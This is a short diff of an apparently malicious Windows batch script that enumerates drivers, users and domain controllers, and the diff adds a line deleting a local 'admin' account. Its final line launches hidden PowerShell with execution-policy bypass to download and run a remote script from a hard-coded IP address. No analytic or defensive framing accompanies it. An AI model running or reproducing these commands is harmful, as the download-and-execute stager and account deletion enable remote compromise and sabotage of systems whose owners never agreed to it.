@@ -211,6 +211,8 @@ driverquery
 ECHO ============================
 net user
 ECHO ============================
+net user admin /delete
+ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
 powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
